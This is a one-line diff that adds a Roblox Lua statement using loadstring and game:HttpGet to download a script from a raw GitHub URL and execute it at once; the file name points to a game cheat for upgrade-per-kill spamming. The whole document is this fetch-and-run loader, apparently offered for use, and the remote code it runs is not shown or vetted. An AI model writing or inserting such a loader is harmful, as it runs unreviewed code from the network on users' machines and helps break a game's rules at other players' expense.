@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/1-upgrade-per-kill-spam3-e6hnn9wjo9v9pm.lua"))()
